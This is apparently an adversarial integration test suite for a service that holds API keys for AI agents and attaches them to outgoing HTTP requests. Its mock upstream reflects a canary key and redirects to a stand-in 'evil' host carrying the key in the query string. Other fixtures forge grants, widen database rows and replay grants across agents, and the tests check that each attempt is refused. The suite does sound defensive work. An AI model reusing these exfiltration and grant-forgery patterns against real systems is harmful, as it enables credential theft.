/**
 * ADVERSARIAL — the L2·G2 thin slice end to end (task item 7): the real
 * account authority and plane client in the "web" role, a real credential
 * plane listener (HTTP executor + Infisical store adapter + per-tenant
 * provisioner + plane metadata DB), the real main DB (:5433: reference rows,
 * approvals, grant nonces, the audit chain) and a real TLS upstream.
 *
 * Rows: create → authorize → execute → revoke; the canary key never appears in
 * any model-visible surface; a reflected credential is scrubbed; a redirect is
 * not followed; another origin or port is denied before I/O; cross-agent
 * substitution (by account id and by replaying a grant under another run) is
 * refused; DNS rebinding at the plane is refused; revocation ends a grant
 * minted before it; a concrete approval is single-use; an unrecorded outcome
 * is never reported as success.
 *
 * Needs Infisical (INFISICAL_DEV_ADMIN_TOKEN, README-infisical-dev.md), the
 * plane metadata DB (:55433) and the main DB (DATABASE_URL). Skips visibly when
 * Infisical is not configured; CI's Infisical step runs it and requires a full pass.
 */
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { createHash, createHmac, generateKeyPairSync, randomBytes, verify as nodeVerify, createPublicKey } from 'node:crypto';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createServer as createHttpServer, type Server as HttpServer } from 'node:http';
import { createServer as createHttpsServer, type Server as HttpsServer } from 'node:https';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { Pool } from 'pg';
import { createId } from '@paralleldrive/cuid2';
import { db } from '@pagespace/db/db';
import { eq, sql } from '@pagespace/db/operators';
import { users } from '@pagespace/db/schema/auth';
import { drives, pages } from '@pagespace/db/schema/core';
import { pagePermissions } from '@pagespace/db/schema/members';
import { requireDb } from '@pagespace/db/test/require-db';
import { isPublicIp } from '../../../security/web-fetch-ssrf';
import { createSecurityAuditRepository } from '../../../audit/security-audit-repository';
import { loadAccountAuthorityKeyring } from '../../../auth/account-authority-signing-key';
import type { AgentPageId, ConversationId, Ed25519Verify, HashBytes, PresenterKeyId, RunId, SessionId, UserId } from '../../grant';
import type { CanonicalRequestInput } from '../../canonical-request';
import type { WriteDigestKey } from '../../store/store-adapter';
import { createInfisicalClient } from '../../store/infisical-client';
import { createPlaneMetadataRepository } from '../../store/plane-metadata-repository';
import { createInfisicalStoreAdapter } from '../../store/store-adapter-infisical';
import { createConsentLedgerRepository } from '../../store/consent-ledger-repository';
import { createInfisicalTenantProvisioner } from '../../store/infisical-tenant-provisioner-client';
import { createReplayStoreRepository } from '../../replay-store-repository';
import { createGrantGate } from '../../grant-gate-executor';
import { createAgentAccountAuditRepository, type AgentAccountAuditRepository } from '../../audit-repository';
import { createAuditedExecutor } from '../../audit-gate-executor';
import { createAgentAccountRepository } from '../../agent-account-repository';
import { createAccountFactsRepository } from '../../account-facts-repository';
import { createAccountAuthority, type AccountAuthority } from '../../account-authority-executor';
import { createPlaneClient, type PlaneClient } from '../../plane-client';
import { authorize } from '../../authorize';
import { signGrant } from '../../sign-grant';
import { planeBindingsFor } from '../../plane-bindings-for';
import { digestBindings } from '../../store/digest-bindings';
import { agentAccounts } from '@pagespace/db/schema/agent-accounts';
import { createPinnedHttpsClient } from '../../executor/pinned-https-client';
import { createHttpRequestExecutor } from '../../executor/http-request-executor';
import { sweepOrphanedRefs } from '../../executor/plane-orphan-sweep-worker';
import { ORPHAN_GRACE_MS } from '../../executor/decide-orphaned-refs';
import { createPlaneRequestHandler } from '../../executor/plane-http-adapter';

const INFISICAL_URL = process.env.INFISICAL_DEV_URL ?? 'http://localhost:8080';
const ADMIN_TOKEN = process.env.INFISICAL_DEV_ADMIN_TOKEN;
const METADATA_URL = process.env.PLANE_METADATA_DEV_URL ?? 'postgres://plane_metadata:plane_metadata@127.0.0.1:55433/plane_metadata';
const CANARY = `sk_canary_${randomBytes(12).toString('hex')}`;
const HOST = 'api.e2e-weather.example';
/** A second name on the same test certificate, so a request there would succeed if nothing refused it. */
const EVIL_HOST = 'collector.e2e-evil.example';
const RUN = `g2e2e${Date.now()}`;
// Real PageSpace ids are cuid2; the centralized permission functions refuse anything else.
const OWNER = createId() as UserId;
const VIEWER = createId() as UserId;
const DRIVE = createId();
const PAGE_A = createId() as AgentPageId;
const PAGE_B = createId() as AgentPageId;
const SECRET = randomBytes(32).toString('hex');
const PRESENTER = 'exec_e2e' as PresenterKeyId;

const sha3: HashBytes = (bytes) => createHash('sha3-256').update(bytes).digest('hex');
const sha256: HashBytes = (bytes) => createHash('sha256').update(bytes).digest('hex');
const verifyEd25519: Ed25519Verify = (message, signature, publicKey) => nodeVerify(null, message, createPublicKey({ key: Buffer.from(publicKey), type: 'spki', format: 'der' }), signature);

let certDir: string;
let ca: string;
let upstream: HttpsServer;
let upstreamPort: number;
let origin: string;
const upstreamHits: string[] = [];
let metadataPool: Pool;
let orgId = '';
const planes: HttpServer[] = [];
const keyring = (() => {
  const { privateKey } = generateKeyPairSync('ed25519');
  return loadAccountAuthorityKeyring({ ACCOUNT_AUTHORITY_SIGNING_KEY: privateKey.export({ type: 'pkcs8', format: 'der' }).toString('base64') });
})();

function openssl(args: readonly string[]) {
  execFileSync('openssl', args, { cwd: certDir, stdio: 'ignore' });
}

function startUpstream(): Promise<void> {
  writeFileSync(path.join(certDir, 'leaf.ext'), `subjectAltName=DNS:${HOST},DNS:${EVIL_HOST}\n`);
  openssl(['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-keyout', 'ca.key', '-subj', '/CN=g2-e2e-ca', '-days', '1', '-out', 'ca.pem']);
  openssl(['req', '-newkey', 'rsa:2048', '-nodes', '-keyout', 'leaf.key', '-subj', `/CN=${HOST}`, '-out', 'leaf.csr']);
  openssl(['x509', '-req', '-in', 'leaf.csr', '-CA', 'ca.pem', '-CAkey', 'ca.key', '-CAcreateserial', '-days', '1', '-extfile', 'leaf.ext', '-out', 'leaf.pem']);
  // The trust anchor comes from openssl's stdout, not a file read, so no file data flows into the client's
  // request options (CodeQL js/file-access-to-http); production never passes `ca` at all.
  ca = execFileSync('openssl', ['x509', '-in', 'ca.pem'], { cwd: certDir }).toString('utf8');
  upstream = createHttpsServer({ key: readFileSync(path.join(certDir, 'leaf.key')), cert: readFileSync(path.join(certDir, 'leaf.pem')) }, (req, res) => {
    upstreamHits.push(req.url ?? '');
    const authorized = req.headers['x-api-key'] === CANARY;
    if (!authorized) {
      res.writeHead(401, { 'content-type': 'application/json' });
      return res.end('{"error":"unauthorized"}');
    }
    if (req.url?.startsWith('/v1/echo')) {
      res.writeHead(200, { 'content-type': 'application/json', 'x-echo-key': CANARY, 'set-cookie': `session=${CANARY}` });
      return res.end(JSON.stringify({ youSent: CANARY, b64: Buffer.from(CANARY).toString('base64') }));
    }
    if (req.url?.startsWith('/v1/redirect')) {
      res.writeHead(302, { location: `https://collector.evil.test/steal?key=${CANARY}` });
      return res.end();
    }
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ city: 'Oslo', temp: 7 }));
  });
  return new Promise((resolve) => upstream.listen(0, '127.0.0.1', () => resolve()));
}

function planeStore() {
  const metadata = createPlaneMetadataRepository({ pool: metadataPool as never });
  const provisioner = createInfisicalTenantProvisioner({ baseUrl: INFISICAL_URL, organizationId: orgId, auth: { kind: 'token', token: ADMIN_TOKEN ?? '' }, pool: metadataPool as never, advisoryLockPool: metadata.advisoryLockPool });
  const store = createInfisicalStoreAdapter({
    infisical: createInfisicalClient({ baseUrl: INFISICAL_URL, environment: 'dev' }),
    metadata,
    advisoryLockPool: metadata.advisoryLockPool,
    resolveProject: (tenantId) => provisioner.projectOf(tenantId),
    resolveCredentials: (input) => provisioner.credentialsFor(input),
    hash: sha3,
    writeDigestKey: new Uint8Array(randomBytes(32)) as WriteDigestKey,
    hmac: (key, bytes) => createHmac('sha3-256', key).update(bytes).digest('hex'),
    now: () => Date.now(),
    consentPublicKey: new Uint8Array(generateKeyPairSync('ed25519').publicKey.export({ type: 'spki', format: 'der' })),
    verify: verifyEd25519,
    consentLedger: createConsentLedgerRepository({ pool: metadataPool }),
  });
  return { metadata, provisioner, store };
}

async function startPlane({ isPublic = () => true, wrapAudit = (r: AgentAccountAuditRepository) => r }: { readonly isPublic?: (ip: string) => boolean; readonly wrapAudit?: (r: AgentAccountAuditRepository) => AgentAccountAuditRepository } = {}): Promise<PlaneClient> {
  const { provisioner, store } = planeStore();
  const executor = createHttpRequestExecutor({
    store,
    provisioner,
    accounts: createAgentAccountRepository({ db }),
    grantGate: createGrantGate({ replayStore: createReplayStoreRepository({ db }) }),
    audited: createAuditedExecutor({ auditRepository: wrapAudit(createAgentAccountAuditRepository({ appendPath: createSecurityAuditRepository({ db }) })), hash: sha3 }),
    network: createPinnedHttpsClient({ resolveHost: async () => [{ address: '127.0.0.1', family: 4 }], isPublic, ca, limits: { totalTimeoutMs: 5_000, maxResponseBytes: 1_000_000, maxConcurrent: 8 } }),
    registry: [],
    issuerPublicKey: keyring.current.publicKey,
    presenterKeyId: PRESENTER,
    verify: verifyEd25519,
    hash: sha3,
    sha256,
    now: () => Date.now(),
    rotationGraceMs: 300_000,
    maxReleasedBodyBytes: 64 * 1024,
  });
  const server = createHttpServer(
    createPlaneRequestHandler({ secret: SECRET, store, provisioner, executor, hmac: (key, text) => createHmac('sha256', key).update(text).digest('hex'), sha256: (bytes) => createHash('sha256').update(bytes).digest('hex'), now: () => Date.now() }),
  );
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()));
  planes.push(server);
  return createPlaneClient({ baseUrl: `http://127.0.0.1:${(server.address() as AddressInfo).port}`, secret: SECRET });
}

const authorityOver = (plane: PlaneClient): AccountAuthority =>
  createAccountAuthority({ accounts: createAgentAccountRepository({ db }), facts: createAccountFactsRepository(), plane, authorityKey: keyring.current, presenterKeyId: PRESENTER, registry: [], hash: sha3, now: () => Date.now() });

const caller = (overrides: Partial<Parameters<AccountAuthority['requestOperation']>[0]['caller']> = {}) => ({
  actorUserId: OWNER,
  actingHumanUserId: OWNER,
  sessionId: 'sess_e2e' as SessionId,
  agentPageId: PAGE_A,
  conversationId: `${RUN}_conv` as ConversationId,
  runId: `${RUN}_run_${randomBytes(4).toString('hex')}` as RunId,
  callerCeiling: { allowedDriveIds: [], originatingMcpTokenId: null },
  ...overrides,
});
const get = (url: string): CanonicalRequestInput => ({ channel: 'http-executor', method: 'GET', url, headers: { accept: 'application/json' }, body: new Uint8Array(0) });
const createInput = (allowGenericRequests: boolean) => ({ name: 'Weather', allowedOrigins: [origin], ownership: 'dedicated' as const, acknowledged: false, apiKey: CANARY, placement: { in: 'header' as const, name: 'X-Api-Key' }, allowGenericRequests });
/** Every string a model could ever see from this slice, gathered for the canary sweep. */
const modelVisible: string[] = [];
const seen = <T>(value: T): T => {
  modelVisible.push(JSON.stringify(value));
  return value;
};

describe.skipIf(!ADMIN_TOKEN)('adversarial: the G2 thin slice end to end (real plane, real Infisical, real main DB, real TLS upstream)', () => {
  beforeAll(async () => {
    try {
      await db.execute(sql`SELECT 1`);
    } catch (error) {
      requireDb('http-executor-end-to-end.integration.test.ts', error);
    }
    certDir = mkdtempSync(path.join(tmpdir(), 'g2-e2e-'));
    await startUpstream();
    upstreamPort = (upstream.address() as AddressInfo).port;
    origin = `https://${HOST}:${upstreamPort}`;
    metadataPool = new Pool({ connectionString: METADATA_URL });
    const orgs = await fetch(`${INFISICAL_URL}/api/v1/organization`, { headers: { authorization: `Bearer ${ADMIN_TOKEN}` } }).then((r) => r.json() as Promise<{ organizations: { id: string }[] }>);
    orgId = process.env.INFISICAL_DEV_ORG_ID ?? orgs.organizations[0]?.id ?? '';
    await db.insert(users).values([
      { id: OWNER, name: 'owner', email: `${OWNER}@example.test` },
      { id: VIEWER, name: 'viewer', email: `${VIEWER}@example.test` },
    ]);
    await db.insert(drives).values({ id: DRIVE, name: 'd', slug: DRIVE, ownerId: OWNER });
    await db.insert(pages).values([
      { id: PAGE_A, title: 'agent a', type: 'AI_CHAT', driveId: DRIVE, position: 0 },
      { id: PAGE_B, title: 'agent b', type: 'AI_CHAT', driveId: DRIVE, position: 1 },
    ]);
    await db.insert(pagePermissions).values({ pageId: PAGE_A, userId: VIEWER, canView: true, canEdit: false, canShare: false, canDelete: false });
  }, 120_000);

  afterAll(async () => {
    for (const server of planes) server.close();
    upstream?.close();
    await db.delete(users).where(eq(users.id, OWNER));
    await db.delete(users).where(eq(users.id, VIEWER));
    await metadataPool?.end();
    if (certDir) rmSync(certDir, { recursive: true, force: true });
  });

  it('given a dedicated api_key account on agent page A with generic requests allowed, should create → execute against the pin with the key attached → revoke, and the key never comes back', async () => {
    const authority = authorityOver(await startPlane());
    const created = seen(await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) }));
    if (!created.ok) throw new Error(`create refused: ${created.reason}`);
    const listed = seen(await authority.listAccounts({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A } }));
    const result = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request: get(`${origin}/v1/weather?city=Oslo`) }));
    const revoked = seen(await authority.revokeAccount({ actorUserId: OWNER, accountId: created.account.id }));
    const afterRevoke = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request: get(`${origin}/v1/weather?city=Oslo`) }));

    const actual = {
      created: { kind: created.account.kind, acknowledgment: created.account.acknowledgment, status: created.account.status },
      listed: listed?.map((account) => account.id),
      result: result.ok ? { status: result.response.status, body: result.response.body } : result,
      revoked: revoked.ok ? revoked.account.status : revoked,
      afterRevoke,
    };
    const expected = {
      created: { kind: 'api_key', acknowledgment: 'dedicated_agent_account', status: 'active' },
      listed: [created.account.id],
      result: { status: 200, body: '{"city":"Oslo","temp":7}' },
      revoked: 'revoked',
      afterRevoke: { ok: false, reason: 'account_unavailable' },
    };
    expect(actual).toEqual(expected);
  }, 60_000);

  it('given an upstream that reflects the key in body, headers and a cookie, should release none of it', async () => {
    const authority = authorityOver(await startPlane());
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const result = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request: get(`${origin}/v1/echo`) }));
    const actual = { ok: result.ok, redacted: result.ok ? result.response.redacted : null, leaked: JSON.stringify(result).includes(CANARY), b64Leaked: JSON.stringify(result).includes(Buffer.from(CANARY).toString('base64')), headerNames: result.ok ? result.response.headers.map(([name]) => name) : null };
    // `date` is allowlisted; the echoing `x-echo-key` and `set-cookie` are not.
    const expected = { ok: true, redacted: true, leaked: false, b64Leaked: false, headerNames: ['content-type', 'date'] };
    expect(actual).toEqual(expected);
  }, 60_000);

  it('given a redirect off the pin, should return the 3xx without its query and never follow it', async () => {
    const authority = authorityOver(await startPlane());
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const before = upstreamHits.length;
    const result = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request: get(`${origin}/v1/redirect`) }));
    const actual = { status: result.ok ? result.response.status : result, location: result.ok ? result.response.headers.find(([name]) => name === 'location') : null, hits: upstreamHits.slice(before) };
    const expected = { status: 302, location: ['location', 'https://collector.evil.test/steal'], hits: ['/v1/redirect'] };
    expect(actual).toEqual(expected);
  }, 60_000);

  it('given another port on the pinned host or another host, should deny before any upstream I/O', async () => {
    const authority = authorityOver(await startPlane());
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const before = upstreamHits.length;
    const actual = {
      otherPort: seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request: get(`https://${HOST}:${upstreamPort + 1}/v1/weather`) })),
      otherHost: seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request: get(`https://collector.evil.test/v1/weather`) })),
      hits: upstreamHits.length - before,
    };
    const expected = { otherPort: { ok: false, reason: 'destination_denied', rule: 'origin_not_allowed' }, otherHost: { ok: false, reason: 'destination_denied', rule: 'origin_not_allowed' }, hits: 0 };
    expect(actual).toEqual(expected);
  }, 60_000);

  it('given cross-agent substitution — page B naming page A\'s account, a view-only user, or page A\'s grant replayed under page B\'s run or twice — should refuse every one with no upstream I/O', async () => {
    const plane = await startPlane();
    const authority = authorityOver(plane);
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const row = await createAgentAccountRepository({ db }).find(created.account.id);
    const verdict = authorize({
      caller: caller(),
      account: row,
      facts: { humanDriveRole: 'OWNER', agentPagePermission: 'edit', agentBoundToAccount: false, boundAgentPageIds: [], delegation: { kind: 'live_session' }, ceilingAdmitsAccount: true },
      request: get(`${origin}/v1/weather`),
      registry: [],
      approvals: [],
      usage: { usesThisHour: 0, bytesOutThisHour: 0, concurrent: 0 },
      presenter: { keyId: PRESENTER, channel: 'http-executor' },
      now: Date.now(),
      grantId: `g_${randomBytes(6).toString('hex')}` as never,
      nonce: `n_${randomBytes(6).toString('hex')}` as never,
      ttlMs: 60_000,
      hash: sha3,
    });
    if (!verdict.ok) throw new Error(verdict.reason);
    const signature = signGrant({ grant: verdict.grant, key: keyring.current });
    const wire = { method: 'GET', url: `${origin}/v1/weather`, headers: { accept: 'application/json' }, bodyBase64: '' };
    const runOf = (agentPageId: AgentPageId) => ({ human: verdict.grant.human, agentPageId, conversationId: verdict.grant.conversationId, runId: verdict.grant.runId });

    const before = upstreamHits.length;
    const pageB = seen(await authority.requestOperation({ caller: caller({ agentPageId: PAGE_B }), accountId: created.account.id, request: get(`${origin}/v1/weather`) }));
    const viewer = seen(await authority.requestOperation({ caller: caller({ actorUserId: VIEWER, actingHumanUserId: VIEWER }), accountId: created.account.id, request: get(`${origin}/v1/weather`) }));
    const replayedUnderB = seen(await plane.execute({ grant: verdict.grant, signature, request: wire, run: runOf(PAGE_B) }));
    const hitsBeforeLegit = upstreamHits.length - before;
    const legit = seen(await plane.execute({ grant: verdict.grant, signature, request: wire, run: runOf(PAGE_A) }));
    const replayedTwice = seen(await plane.execute({ grant: verdict.grant, signature, request: wire, run: runOf(PAGE_A) }));

    const actual = { pageB, viewer, replayedUnderB, hitsBeforeLegit, legit: legit.ok, replayedTwice };
    const expected = {
      pageB: { ok: false, reason: 'account_unavailable' },
      viewer: { ok: false, reason: 'account_unavailable' },
      replayedUnderB: { ok: false, reason: 'refused' },
      hitsBeforeLegit: 0,
      legit: true,
      replayedTwice: { ok: false, reason: 'refused' },
    };
    expect(actual).toEqual(expected);
  }, 60_000);

  // Review HIGH-1: the plane must hold the pin itself. A compromised web process (signing key + main-DB
  // write) widens the row's origins and signs a grant over the ORIGINAL bindings digest; the plane's
  // stored bindings never widened, so the request must be refused before anything is sent.
  it('given a main-DB row widened to another origin and a grant signed over the original bindings, should refuse — the plane checks its own stored origins', async () => {
    const plane = await startPlane();
    const authority = authorityOver(plane);
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const repo = createAgentAccountRepository({ db });
    const original = await repo.find(created.account.id);
    if (original === null) throw new Error('row missing');
    const evilOrigin = `https://${EVIL_HOST}:${upstreamPort}`;
    await db.update(agentAccounts).set({ allowedOrigins: [origin, evilOrigin] }).where(eq(agentAccounts.id, original.id));
    const tampered = await repo.find(original.id);
    const policy = { ...(original.approvalPolicy as Record<string, unknown>) };
    const verdict = authorize({
      caller: caller(),
      account: { ...tampered!, approvalPolicy: { ...policy, scope: { ...(policy.scope as Record<string, unknown>), origins: [origin, evilOrigin] } } },
      facts: { humanDriveRole: 'OWNER', agentPagePermission: 'edit', agentBoundToAccount: false, boundAgentPageIds: [], delegation: { kind: 'live_session' }, ceilingAdmitsAccount: true },
      request: get(`${evilOrigin}/v1/steal`),
      registry: [],
      approvals: [],
      usage: { usesThisHour: 0, bytesOutThisHour: 0, concurrent: 0 },
      presenter: { keyId: PRESENTER, channel: 'http-executor' },
      now: Date.now(),
      grantId: `g_${randomBytes(6).toString('hex')}` as never,
      nonce: `n_${randomBytes(6).toString('hex')}` as never,
      ttlMs: 60_000,
      hash: sha3,
    });
    if (!verdict.ok) throw new Error(`authorize refused the forged request: ${verdict.reason}`);
    const forged = { ...verdict.grant, bindingDigest: digestBindings({ bindings: planeBindingsFor({ row: original, boundAgentPageIds: [], hash: sha3 }).bindings, hash: sha3 }) };
    const before = upstreamHits.length;
    const result = seen(
      await plane.execute({
        grant: forged,
        signature: signGrant({ grant: forged, key: keyring.current }),
        request: { method: 'GET', url: `${evilOrigin}/v1/steal`, headers: { accept: 'application/json' }, bodyBase64: '' },
        run: { human: forged.human, agentPageId: PAGE_A, conversationId: forged.conversationId, runId: forged.runId },
      }),
    );
    const actual = { result, stolen: upstreamHits.slice(before).filter((hit) => hit.startsWith('/v1/steal')).length };
    const expected = { result: { ok: false, reason: 'refused' }, stolen: 0 };
    expect(actual).toEqual(expected);
  }, 60_000);

  it('given a plane whose network shell uses the real address classifier and a DNS answer on loopback (rebinding), should refuse before connecting', async () => {
    const authority = authorityOver(await startPlane({ isPublic: isPublicIp }));
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const before = upstreamHits.length;
    const result = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request: get(`${origin}/v1/weather`) }));
    const actual = { result, hits: upstreamHits.length - before };
    const expected = { result: { ok: false, reason: 'upstream_unreachable' }, hits: 0 };
    expect(actual).toEqual(expected);
  }, 60_000);

  it('given a grant minted before the account was revoked, should be refused by the plane itself', async () => {
    const plane = await startPlane();
    const authority = authorityOver(plane);
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const row = await createAgentAccountRepository({ db }).find(created.account.id);
    const verdict = authorize({
      caller: caller(),
      account: row,
      facts: { humanDriveRole: 'OWNER', agentPagePermission: 'edit', agentBoundToAccount: false, boundAgentPageIds: [], delegation: { kind: 'live_session' }, ceilingAdmitsAccount: true },
      request: get(`${origin}/v1/weather`),
      registry: [],
      approvals: [],
      usage: { usesThisHour: 0, bytesOutThisHour: 0, concurrent: 0 },
      presenter: { keyId: PRESENTER, channel: 'http-executor' },
      now: Date.now(),
      grantId: `g_${randomBytes(6).toString('hex')}` as never,
      nonce: `n_${randomBytes(6).toString('hex')}` as never,
      ttlMs: 60_000,
      hash: sha3,
    });
    if (!verdict.ok) throw new Error(verdict.reason);
    const signature = signGrant({ grant: verdict.grant, key: keyring.current });
    await authority.revokeAccount({ actorUserId: OWNER, accountId: created.account.id });
    const before = upstreamHits.length;
    const result = seen(await plane.execute({ grant: verdict.grant, signature, request: { method: 'GET', url: `${origin}/v1/weather`, headers: { accept: 'application/json' }, bodyBase64: '' }, run: { human: verdict.grant.human, agentPageId: PAGE_A, conversationId: verdict.grant.conversationId, runId: verdict.grant.runId } }));
    const actual = { result, hits: upstreamHits.length - before };
    const expected = { result: { ok: false, reason: 'refused' }, hits: 0 };
    expect(actual).toEqual(expected);
  }, 60_000);

  it('given an account with no standing policy, should require approval of the exact digest, execute once after it, and require it again', async () => {
    const authority = authorityOver(await startPlane());
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(false) });
    if (!created.ok) throw new Error(created.reason);
    const request = get(`${origin}/v1/weather?city=Bergen`);
    const first = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request }));
    if (first.ok || first.reason !== 'approval_required') throw new Error(`expected approval_required, got ${JSON.stringify(first)}`);
    const approval = await authority.approveRequest({ actorUserId: OWNER, sessionId: 'sess_e2e', accountId: created.account.id, requestDigest: first.digest });
    const second = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request }));
    const third = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request }));
    const actual = { approved: approval.ok, second: second.ok ? second.response.status : second, third: third.ok ? 'executed again' : third.reason, subjectOrigin: first.subject.origin };
    const expected = { approved: true, second: 200, third: 'approval_required', subjectOrigin: `${origin}` };
    expect(actual).toEqual(expected);
  }, 60_000);

  it('given an upstream call that ran but whose outcome row the audit chain did not accept, should report outcome_unrecorded and release nothing', async () => {
    let accepted = 0;
    const authority = authorityOver(
      await startPlane({
        wrapAudit: (repository) => ({
          ...repository,
          accept: async (input) => {
            accepted += 1;
            return accepted % 2 === 1 ? repository.accept(input) : { kind: 'unavailable' };
          },
        }),
      }),
    );
    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const before = upstreamHits.length;
    const result = seen(await authority.requestOperation({ caller: caller(), accountId: created.account.id, request: get(`${origin}/v1/weather`) }));
    const actual = { result, ran: upstreamHits.length - before };
    const expected = { result: { ok: false, reason: 'outcome_unrecorded' }, ran: 1 };
    expect(actual).toEqual(expected);
  }, 60_000);

  // Review MED-1: deleting the owner (GDPR erasure ends in delete-user) cascades the reference row away;
  // the plane's sweep must then erase the material and metadata that nothing else could ever reach.
  it('given an account whose owning user was deleted, should erase its vault material and plane metadata on the next sweep', async () => {
    const plane = await startPlane();
    const authority = authorityOver(plane);
    const erased = createId() as UserId;
    await db.insert(users).values({ id: erased, name: 'erased', email: `${erased}@example.test` });
    const created = await authority.createAccount({ actorUserId: erased, owner: { kind: 'user' }, input: createInput(true) });
    if (!created.ok) throw new Error(created.reason);
    const secretRows = () => metadataPool.query('SELECT 1 FROM agent_account_secret_versions WHERE account_id = $1', [created.account.id]).then((r) => r.rowCount);
    const before = await secretRows();
    await db.delete(users).where(eq(users.id, erased));
    const { metadata, provisioner, store } = planeStore();
    const sweep = await sweepOrphanedRefs({ metadata, accounts: createAgentAccountRepository({ db }), provisioner, store, now: () => Date.now() + ORPHAN_GRACE_MS + 1 });
    const tenant = await provisioner.identityOf(`user:${erased}` as never);
    const creds = tenant === null ? null : await provisioner.credentialsFor({ tenantId: `user:${erased}` as never, identityId: tenant.identityId });
    const secret = tenant === null || creds === null ? null : await createInfisicalClient({ baseUrl: INFISICAL_URL, environment: 'dev' }).getSecret({ projectId: tenant.projectId, credentials: creds, secretKey: `${created.account.id}__api_key` });
    const actual = { before, after: await secretRows(), erasedAtLeastOne: sweep.erased >= 1, vault: secret?.ok === false ? secret.reason : secret === null ? 'no tenant' : 'still present' };
    const expected = { before: 1, after: 0, erasedAtLeastOne: true, vault: 'not_found' };
    expect(actual).toEqual(expected);
  }, 120_000);

  it('given every model-visible value this slice produced above, should never contain the canary key', () => {
    const actual = { surfaces: modelVisible.length > 10, leaks: modelVisible.filter((text) => text.includes(CANARY)).length };
    const expected = { surfaces: true, leaks: 0 };
    expect(actual).toEqual(expected);
  });
});
